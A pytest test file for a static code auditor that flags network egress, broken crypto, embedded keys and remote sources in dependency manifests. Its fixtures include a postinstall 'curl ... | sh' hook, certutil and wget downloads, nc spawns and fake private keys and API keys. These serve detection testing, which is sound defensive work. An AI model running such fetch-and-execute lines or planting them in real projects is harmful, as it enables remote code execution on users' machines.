"""Coverage accounting, OS-independent reports, Python that does not look like Python, manifests, and
the signer's restored-backup rule. Each test here pins a behaviour a reader of the README relies on."""
import json
import py_compile
import subprocess
import sys
import zipfile
from dataclasses import asdict
from pathlib import Path

import pytest

from entrovouch import cbom, key_provenance
from entrovouch.manifests import collect_manifests
from entrovouch.no_egress_auditor import (
    SKIP_DIRS, _rel, _tree_digest, audit, main, render_markdown,
)
from entrovouch.signer import KeyExhausted, MerkleSigner

URL = "https://telemetry.example.invalid/c"
EGRESS = f"import urllib.request\nurllib.request.urlopen('{URL}')\n"


def _write(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8", newline="\n")
    return p


# ---------------------------------------------------------------- paths are the same on every OS
def test_report_paths_use_forward_slashes(tmp_path):
    _write(tmp_path, "pkg/sub/a.py", "import requests\n")
    rep = audit(tmp_path, label="t")
    assert rep.findings[0]["file"] == "pkg/sub/a.py"
    assert "\\" not in json.dumps(asdict(rep))


def test_subject_digest_tells_a_backslash_in_a_name_from_a_folder():
    # On POSIX `pkg\a.py` is one file whose name holds a backslash; `pkg/a.py` is a file in a folder. Two trees.
    with_backslash = [("pkg\\a.py", "00" * 32), ("pkg0.py", "11" * 32)]
    with_folder = [("pkg/a.py", "00" * 32), ("pkg0.py", "11" * 32)]
    assert _tree_digest(with_backslash) != _tree_digest(with_folder)
    assert _tree_digest(list(reversed(with_folder))) == _tree_digest(with_folder)


def test_report_paths_use_forward_slashes_on_this_system(tmp_path):
    _write(tmp_path, "pkg/sub/a.py", "import requests\n")
    assert {f["file"] for f in asdict(audit(tmp_path, label="t"))["findings"]} == {"pkg/sub/a.py"}
    assert _rel(tmp_path / "pkg" / "sub" / "a.py", tmp_path) == "pkg/sub/a.py"


def test_other_tools_use_forward_slashes_too(tmp_path):
    _write(tmp_path, "pkg/sub/c.py", "import hashlib\nhashlib.md5(b'x')\nSECRET_KEY = 'abcdef0123456789'\n")
    c = asdict(cbom.build_cbom(tmp_path, label="t"))
    k = asdict(key_provenance.scan_key_provenance(tmp_path, label="t"))
    assert {u["file"] for u in c["components"]} == {"pkg/sub/c.py"}
    assert {f["file"] for f in k["findings"]} == {"pkg/sub/c.py"}


# ---------------------------------------------------------------- what was not read is said
@pytest.mark.parametrize("skipped", sorted(SKIP_DIRS - {".git"}))
def test_skipped_directories_are_reported_with_their_file_counts(tmp_path, skipped):
    _write(tmp_path, f"src/{skipped}/hidden.py", EGRESS)
    _write(tmp_path, "main.py", "x = 1\n")
    rep = audit(tmp_path, label="t")
    assert rep.verdict == "CLEAN"
    assert rep.not_scanned["skipped_directories"] == {f"src/{skipped}/": 1}


def test_unscanned_file_types_are_counted(tmp_path):
    _write(tmp_path, "main.py", "x = 1\n")
    _write(tmp_path, "a.go", 'package main\n')
    _write(tmp_path, "b.go", 'package main\n')
    _write(tmp_path, "notes.rst", "text\n")
    _write(tmp_path, "LICENSE", "MIT\n")
    rep = audit(tmp_path, label="t")
    assert rep.not_scanned["files_by_extension"] == {".go": 2, ".rst": 1, "(no extension)": 1}
    assert rep.files_not_read == 4
    assert "Files of types this tool does not read" in render_markdown(rep)


def test_manifests_are_not_counted_as_unscanned(tmp_path):
    _write(tmp_path, "main.py", "x = 1\n")
    _write(tmp_path, "requirements.txt", "numpy\n")
    _write(tmp_path, "pyproject.toml", '[project]\nname = "x"\nversion = "0"\n')
    rep = audit(tmp_path, label="t")
    assert rep.not_scanned["files_by_extension"] == {}
    assert rep.files_scanned == 3


def test_nothing_scanned_is_not_analysed_and_exits_2(tmp_path, capsys):
    _write(tmp_path, "main.rs", "fn main() {}\n")
    assert audit(tmp_path, label="t").verdict == "NOT-ANALYSED"
    assert main([str(tmp_path)]) == 2


def test_not_scanned_is_part_of_the_reproducible_body(tmp_path):
    _write(tmp_path, "main.py", "x = 1\n")
    _write(tmp_path, "a.go", "package main\n")
    with_go = audit(tmp_path, label="t").findings_digest
    (tmp_path / "a.go").unlink()
    assert audit(tmp_path, label="t").findings_digest != with_go


# ---------------------------------------------------------------- Python that does not look like Python
def test_upper_case_extension_is_python(tmp_path):
    _write(tmp_path, "APP.PY", EGRESS)
    assert audit(tmp_path, label="t").verdict == "FINDINGS"


def test_shebang_script_without_extension_is_python(tmp_path):
    _write(tmp_path, "bin/tool", "#!/usr/bin/env python3\n" + EGRESS)
    _write(tmp_path, "bin/other", "#!/bin/sh\necho hi\n")
    _write(tmp_path, "bin/data", "no shebang here\n")
    rep = audit(tmp_path, label="t")
    assert {f["file"] for f in rep.findings} == {"bin/tool"}
    assert rep.files_scanned == 2          # the Python script and the shell script
    assert rep.not_scanned["files_by_extension"] == {"(no extension)": 1}


def test_encoding_cookie_is_decoded_the_way_python_decodes_it(tmp_path):
    """Python decodes the file with the codec its cookie names, which turns the comment into an import."""
    _write(tmp_path, "app.py", "# coding: unicode_escape\n#\\u000aimport urllib.request\n")
    kinds = {f["kind"] for f in audit(tmp_path, label="t").findings}
    assert "network-import" in kinds


def test_notebook_code_cells_are_checked(tmp_path):
    nb = {"cells": [
        {"cell_type": "markdown", "source": ["see https://example.invalid"], "metadata": {}},
        {"cell_type": "code", "source": ["!curl https://example.invalid/x\n", "x = 1\n"], "metadata": {}, "outputs": [], "execution_count": None},
        {"cell_type": "code", "source": "%pip install requests\nimport requests\n", "metadata": {}, "outputs": [], "execution_count": None},
    ], "metadata": {}, "nbformat": 4, "nbformat_minor": 5}
    (tmp_path / "nb.ipynb").write_text(json.dumps(nb), encoding="utf-8")
    rep = audit(tmp_path, label="t")
    kinds = sorted((f["line"], f["kind"]) for f in rep.findings)
    assert kinds == [(2, "subprocess-shell"), (3, "network-import"), (3, "subprocess-net-binary")]


def test_compiled_and_archived_python_is_reported_as_unanalysed(tmp_path):
    src = _write(tmp_path, "src_tmp.py", EGRESS)
    py_compile.compile(str(src), cfile=str(tmp_path / "hidden.pyc"))
    src.unlink()
    with zipfile.ZipFile(tmp_path / "lib.zip", "w") as z:
        z.writestr("hidden.py", EGRESS)
    _write(tmp_path, "main.py", "import hidden\n")
    rep = audit(tmp_path, label="t")
    assert sorted(f["file"] for f in rep.findings if f["kind"] == "unanalysed-artifact") == ["hidden.pyc", "lib.zip"]


def test_one_pathological_file_does_not_stop_the_audit(tmp_path):
    _write(tmp_path, "deep.py", "x = a" + ".b" * 60000 + "\n")
    _write(tmp_path, "real.py", "import requests\n")
    rep = audit(tmp_path, label="t")
    kinds = {f["file"]: f["kind"] for f in rep.findings}
    assert kinds == {"deep.py": "unparseable-source", "real.py": "network-import"}


# ---------------------------------------------------------------- import and spawn forms
@pytest.mark.parametrize("src", [
    "from http import client\n",
    "from multiprocessing import connection\n",
    "from google import cloud\n",
    "import _socket\n",
])
def test_listed_modules_are_caught_in_every_import_form(tmp_path, src):
    _write(tmp_path, "a.py", src)
    assert "network-import" in {f["kind"] for f in audit(tmp_path, label="t").findings}


def test_network_logging_handlers_are_calls(tmp_path):
    _write(tmp_path, "a.py", "import logging.handlers\nh = logging.handlers.HTTPHandler('h', '/c')\n")
    _write(tmp_path, "b.py", "from logging.handlers import SMTPHandler\nh = SMTPHandler('h', 'a', ['b'], 's')\n")
    _write(tmp_path, "c.py", "import logging\nh = logging.FileHandler('x.log')\n")
    files = {f["file"] for f in audit(tmp_path, label="t").findings}
    assert files == {"a.py", "b.py"}


@pytest.mark.parametrize("src,kind", [
    ("import subprocess\nsubprocess.run(['bash', '-c', 'curl %s'])\n" % URL, "subprocess-shell"),
    ("import subprocess\nsubprocess.run(['powershell', '-c', 'Invoke-WebRequest %s'])\n" % URL, "subprocess-shell"),
    ("import os\nos.execvp('curl', ['curl', '%s'])\n" % URL, "subprocess-net-binary"),
    ("import asyncio\nasync def f():\n    await asyncio.create_subprocess_exec('wget', '%s')\n" % URL, "subprocess-net-binary"),
    ("import pty\npty.spawn(['nc', 'h', '80'])\n", "subprocess-net-binary"),
    ("import os\nos.startfile('%s')\n" % URL, "network-call"),
    ("import subprocess\nsubprocess.run(['certutil', '-urlcache', '-f', '%s', 'x'])\n" % URL, "subprocess-net-binary"),
])
def test_other_spawn_forms(tmp_path, src, kind):
    _write(tmp_path, "a.py", src)
    assert kind in {f["kind"] for f in audit(tmp_path, label="t").findings}


@pytest.mark.parametrize("src", [
    "import subprocess\nsubprocess.run(['bash', '-c', 'ls -la'])\n",
    "import os\nos.execvp('ls', ['ls'])\n",
    "import subprocess\nsubprocess.run(['openssl', 'genrsa', '2048'])\n",
])
def test_spawns_that_reach_no_network_stay_clean(tmp_path, src):
    _write(tmp_path, "a.py", src)
    rep = audit(tmp_path, label="t")
    assert {f["kind"] for f in rep.findings} <= {"subprocess-shell"}  # a shell string is still a shell string
    assert not any(f["kind"] == "subprocess-net-binary" for f in rep.findings)


@pytest.mark.parametrize("src", [
    "c = compile('x', 'f', 'exec')\n",
    "import pickle\npickle.loads(b'')\n",
    "import runpy\nrunpy.run_path('p.txt')\n",
    "import importlib.util\ns = importlib.util.spec_from_file_location('m', 'x.bin')\n",
    "import ctypes\nctypes.CDLL('libcurl.so.4')\n",
])
def test_loaders_and_native_calls_are_boundaries(tmp_path, src):
    _write(tmp_path, "a.py", src)
    assert {f["kind"] for f in audit(tmp_path, label="t").findings} & {"dynamic-exec", "native-call"}


def test_method_named_eval_has_its_own_kind(tmp_path):
    _write(tmp_path, "a.py", "model.eval()\n")
    assert [f["kind"] for f in audit(tmp_path, label="t").findings] == ["method-named-exec"]


def test_url_literal_handed_to_a_reader(tmp_path):
    _write(tmp_path, "a.py", f"import pandas as pd\ndf = pd.read_csv('{URL}')\n")
    _write(tmp_path, "b.py", f"print('{URL}')\n")
    files = {f["file"] for f in audit(tmp_path, label="t").findings}
    assert files == {"a.py"}


# ---------------------------------------------------------------- manifests
def test_requirement_lines_that_name_a_host(tmp_path):
    _write(tmp_path, "requirements.txt",
           "--extra-index-url https://example.invalid/simple\n"
           "mypkg @ https://example.invalid/mypkg-1.0.whl\n"
           "git+https://example.invalid/x.git#egg=xx\n"
           "numpy\n")
    rep = audit(tmp_path, label="t")
    assert [f["line"] for f in rep.findings if f["kind"] == "declared-remote-source"] == [1, 2, 3]
    scan = collect_manifests(tmp_path)
    assert sorted(d.name for d in scan.deps) == ["mypkg", "numpy", "xx"]


def test_requirements_includes_are_followed(tmp_path):
    _write(tmp_path, "requirements.txt", "-r base.txt\nnumpy\n")
    _write(tmp_path, "base.txt", "requests==2.32.0\n")
    scan = collect_manifests(tmp_path)
    assert sorted(d.name for d in scan.deps) == ["numpy", "requests"]
    assert {rel for _p, rel in scan.files} == {"requirements.txt", "base.txt"}
    assert "declared-network-dependency" in {f["kind"] for f in audit(tmp_path, label="t").findings}


def test_include_outside_the_tree_is_an_error_not_silence(tmp_path):
    _write(tmp_path, "requirements.txt", "-r ../elsewhere.txt\n")
    scan = collect_manifests(tmp_path)
    assert scan.errors and "was not read" in scan.errors[0].detail


def test_package_json_install_scripts_and_repository_dependencies(tmp_path):
    _write(tmp_path, "package.json", json.dumps({
        "name": "x", "scripts": {"postinstall": "curl -s https://example.invalid/i | sh", "test": "jest"},
        "dependencies": {"left": "git+https://example.invalid/l.git", "right": "^1.0.0"}}))
    details = [f["detail"] for f in audit(tmp_path, label="t").findings if f["kind"] == "declared-remote-source"]
    assert len(details) == 2 and any("postinstall" in d for d in details)


def test_more_manifests_are_read(tmp_path):
    _write(tmp_path, "Pipfile", '[[source]]\nurl = "https://example.invalid/simple"\n\n[packages]\nrequests = "*"\n')
    _write(tmp_path, "environment.yml", "dependencies:\n  - numpy=1.26\n  - pip:\n    - httpx\n")
    _write(tmp_path, "setup.py", "from setuptools import setup\nsetup(name='x', install_requires=['stripe>=5'])\n")
    _write(tmp_path, ".gitmodules", '[submodule "x"]\n\tpath = x\n\turl = https://example.invalid/x.git\n')
    scan = collect_manifests(tmp_path)
    assert sorted(d.name for d in scan.deps) == ["httpx", "numpy", "requests", "stripe"]
    kinds = {f["kind"] for f in audit(tmp_path, label="t").findings}
    assert {"declared-network-dependency", "declared-remote-source", "git-remote"} <= kinds


# ---------------------------------------------------------------- the other two tools
def test_cbom_catches_the_from_import_form_and_says_nothing_on_nothing(tmp_path):
    _write(tmp_path, "a.py", "from hashlib import md5\nmd5(b'x')\n")
    assert cbom.build_cbom(tmp_path, label="t").verdict == "BROKEN-CRYPTO"
    (tmp_path / "a.py").unlink()
    _write(tmp_path, "a.js", "crypto.createHash('md5')\n")
    assert cbom.build_cbom(tmp_path, label="t").verdict == "NOT-ANALYSED"


def test_key_files_and_env_secrets_in_the_tree(tmp_path):
    _write(tmp_path, "id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk=\n-----END OPENSSH PRIVATE KEY-----\n")
    _write(tmp_path, "conf/.env", "API_KEY=sk-live-1234567890abcdef\nDEBUG=1\nSECRET_KEY=${SECRET_KEY}\n")
    _write(tmp_path, "a.py", "import hmac\nh = hmac.new(bytes.fromhex('00112233445566778899aabbccddeeff'), b'm', 'sha256')\n"
                            "def sign(m, signing_key=b'default-signing-key'):\n    return signing_key\n")
    rep = key_provenance.scan_key_provenance(tmp_path, label="t")
    by_file = {}
    for f in rep.findings:
        by_file.setdefault(f["file"], []).append(f["kind"])
    assert by_file["id_rsa"] == ["key-file-in-tree"]
    assert by_file["conf/.env"] == ["literal-key"]          # API_KEY; the placeholder is not reported
    assert sorted(by_file["a.py"]) == ["literal-key", "literal-key"]
    assert rep.verdict == "REVIEW"


def test_key_provenance_on_nothing(tmp_path):
    # a tree whose only file sits in a skipped directory: nothing was read
    _write(tmp_path, "build/out.txt", "x\n")
    rep = key_provenance.scan_key_provenance(tmp_path, label="t")
    assert rep.verdict == "NOT-ANALYSED" and rep.files_scanned == 0
    # every other file is searched for private-key armour, a binary one included: nothing found in two files read
    (tmp_path / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")
    _write(tmp_path, "README.md", "hello\n")
    rep = key_provenance.scan_key_provenance(tmp_path, label="t")
    assert rep.verdict == "NOTHING-FOUND" and rep.files_scanned == 2


# ---------------------------------------------------------------- signer: the restored-backup rule
def test_advance_marks_leaves_spent_and_persists(tmp_path):
    key = tmp_path / "k.json"
    signer = MerkleSigner.create(key, height=3)
    assert signer.advance(5) == 5
    assert MerkleSigner.load(key).next_index == 5
    sig = MerkleSigner.load(key).sign(b"m")
    assert sig["leaf_index"] == 5
    with pytest.raises(KeyExhausted):
        MerkleSigner.load(key).advance(10)


def test_advance_key_cli(tmp_path):
    key = tmp_path / "k.json"
    MerkleSigner.create(key, height=3)
    assert main(["--key", str(key), "--advance-key", "2"]) == 0
    assert MerkleSigner.load(key).next_index == 2
    assert main(["--advance-key", "2"]) == 2
    assert main(["--key", str(tmp_path / "missing.json"), "--advance-key", "2"]) == 2


def test_crash_paths_exit_2(tmp_path):
    _write(tmp_path, "a.py", "x = 1\n")
    r = subprocess.run([sys.executable, "-m", "entrovouch.no_egress_auditor", str(tmp_path),
                        "--key", str(tmp_path / "nokey.json")], capture_output=True, text=True,
                       cwd=Path(__file__).resolve().parents[1])
    assert r.returncode == 2 and "does not exist" in r.stderr


def test_connection_strings_and_native_chains(tmp_path):
    _write(tmp_path, "a.py", "import sqlalchemy\ne = sqlalchemy.create_engine('postgresql://u:p@db.example.invalid/x')\n")
    _write(tmp_path, "b.py", "import sqlalchemy\ne = sqlalchemy.create_engine('sqlite:///local.db')\n")
    _write(tmp_path, "c.py", "import ctypes\nh = ctypes.windll.wininet.InternetOpenW('a', 0, None, None, 0)\n")
    _write(tmp_path, "d.py", "import cffi\nffi = cffi.FFI()\nlib = ffi.dlopen('libcurl.so')\n")
    _write(tmp_path, "e.py", "import subprocess\nsubprocess.run(['openssl', 's_client', '-connect', 'h:443'])\n")
    by_file = {}
    for f in audit(tmp_path, label="t").findings:
        by_file.setdefault(f["file"], set()).add(f["kind"])
    assert by_file == {"a.py": {"network-target"}, "c.py": {"native-call"}, "d.py": {"native-call"},
                       "e.py": {"subprocess-net-binary"}}


def test_pyproject_url_dependency_is_a_remote_source(tmp_path):
    _write(tmp_path, "pyproject.toml", '[project]\nname = "x"\nversion = "0"\n'
                                       'dependencies = ["mypkg @ https://example.invalid/mypkg.whl", "numpy"]\n')
    kinds = {f["kind"] for f in audit(tmp_path, label="t").findings}
    assert "declared-remote-source" in kinds
    assert sorted(d.name for d in collect_manifests(tmp_path).deps) == ["mypkg", "numpy"]


def test_key_material_in_python_source_and_config_files(tmp_path):
    _write(tmp_path, "a.py", "import hashlib\nSIGNING_KEY = hashlib.sha256(b'project-name').digest()\n"
                            "K = '-----BEGIN PRIVATE KEY-----\\nMIIB\\n-----END PRIVATE KEY-----'\n")
    _write(tmp_path, "config.yaml", "secret_key: f3a9c1d27b6e4f80a1b2c3d4e5f60718\napi_key: ${API_KEY}\nname: demo\n")
    _write(tmp_path, "settings.json", '{\n  "signing_key": "0123456789abcdef0123456789abcdef",\n  "mode": "prod"\n}\n')
    rep = key_provenance.scan_key_provenance(tmp_path, label="t")
    got = sorted((f["file"], f["kind"]) for f in rep.findings)
    assert got == [("a.py", "derived-from-literal"), ("a.py", "key-file-in-tree"),
                   ("config.yaml", "literal-key"), ("settings.json", "literal-key")]



# ---------------------------------------------------------------- one depth limit on every Python and every stack
def _in_thread_with_stack(size, fn):
    """Run `fn` in a thread with a stack of `size` bytes: Python 3.14 sets its parser's depth limit from the stack it
    finds, so this reproduces, on any machine, a runner whose stack is larger than this one's."""
    import threading
    out = {}
    old = threading.stack_size()
    threading.stack_size(size)
    try:
        t = threading.Thread(target=lambda: out.setdefault("r", fn()))
        t.start()
        t.join()
    finally:
        threading.stack_size(old)
    return out["r"]


def _three_reports(tree):
    r = audit(tree, label="t")
    c = cbom.build_cbom(tree, label="t")
    k = key_provenance.scan_key_provenance(tree, label="t")
    return (r.verdict, sorted((f["file"], f["kind"]) for f in r.findings),
            c.verdict, sorted(f["file"] for f in c.files_not_parsed),
            k.verdict, sorted((f["file"], f["kind"]) for f in k.findings), sorted(f["file"] for f in k.files_not_parsed))


@pytest.mark.parametrize("depth", [60000, 1010])
def test_a_file_nested_too_deep_is_unparseable_on_any_stack(tmp_path, depth):
    _write(tmp_path, "deep.py", "import hashlib\nSECRET_KEY = 'q8vK2mN4pR7sT1w9x'\nx = a" + ".b" * depth + "\n")
    _write(tmp_path, "real.py", "import requests\n")
    here = _three_reports(tmp_path)
    large = _in_thread_with_stack(64 * 1024 * 1024, lambda: _three_reports(tmp_path))
    assert here == large
    assert ("deep.py", "unparseable-source") in here[1]
    assert here[3] == ["deep.py"] and here[6] == ["deep.py"]


def test_a_file_just_inside_the_depth_limit_is_read_by_every_tool(tmp_path):
    _write(tmp_path, "deep.py", "import hashlib\nSECRET_KEY = 'q8vK2mN4pR7sT1w9x'\nx = a" + ".b" * 990 + "\n")
    rep = _three_reports(tmp_path)
    assert ("deep.py", "unparseable-source") not in rep[1]
    assert rep[3] == [] and rep[6] == [] and ("deep.py", "literal-key") in rep[5]


@pytest.mark.parametrize("depth", [500, 990, 1010])
def test_the_report_does_not_depend_on_how_deep_the_caller_is(tmp_path, depth):
    """Python 3.11's budget for building a syntax tree, and every recursive step, shrink with the caller's own depth.
    A library user calls these tools from wherever they like, so the same file must give the same reports from 0 and
    from 300 frames down."""
    _write(tmp_path, "deep.py", "import requests\nx = requests.get('https://example.com/x')" + ".b" * depth + "\n")

    def down(k):
        return _three_reports(tmp_path) if k == 0 else down(k - 1)

    assert down(0) == down(300)


def test_the_depth_limit_is_below_every_supported_parsers_own():
    import ast
    from entrovouch._parse import MAX_EXPRESSION_DEPTH, NestingTooDeep, parse_python
    assert MAX_EXPRESSION_DEPTH < 2982                     # the 3.11 parser refuses `a.b.b...` 2,983 deep
    ast.parse("x = a" + ".b" * MAX_EXPRESSION_DEPTH)       # every version parses this much
    parse_python("x = a" + ".b" * (MAX_EXPRESSION_DEPTH - 1))
    with pytest.raises(NestingTooDeep):
        parse_python("x = a" + ".b" * (MAX_EXPRESSION_DEPTH + 1))
    with pytest.raises(RecursionError):                    # what every caller already treats as a file it could not read
        parse_python("x = " + "+".join(["1"] * (MAX_EXPRESSION_DEPTH + 2)))


@pytest.mark.parametrize("text, depth_ok", [
    ('{"a": "q\\"[[[", "b": [1]}', True),          # an escaped quote does not end the string, its brackets do not count
    ('{"a": "\\\\", "b": [[1]]}', True),            # an escaped backslash does end before the closing quote
    ('{"s": "' + "[" * 2000 + '"}', True),          # brackets inside a string are text
    ("[" * 900 + "]" * 900, True),
    ("[" * 901 + "]" * 901, False),
    ('{"a":' * 901 + "1" + "}" * 901, False),
])
def test_json_has_one_nesting_limit_on_every_python(text, depth_ok):
    import json
    from entrovouch._parse import MAX_JSON_DEPTH, NestingTooDeep, load_json
    assert MAX_JSON_DEPTH < 990                        # what the 3.11 parser itself accepts
    if depth_ok:
        assert load_json(text) == json.loads(text)
    else:
        with pytest.raises(NestingTooDeep):
            load_json(text)


@pytest.mark.parametrize("name, wrap", [
    ("package.json", lambda deep: '{"name": "x", "dependencies": {"requests": "1.0"}, "x": ' + deep + "}"),
    ("n.ipynb", lambda deep: '{"cells": [{"cell_type": "code", "source": ["import requests"]}], "x": ' + deep + "}"),
])
def test_a_json_file_nested_too_deep_gives_one_report_on_any_stack(tmp_path, name, wrap):
    _write(tmp_path, name, wrap("[" * 20000 + "]" * 20000))   # refused on a 1 MB 3.14 stack, read on a 64 MB one
    here = _three_reports(tmp_path)
    large = _in_thread_with_stack(64 * 1024 * 1024, lambda: _three_reports(tmp_path))
    assert here == large
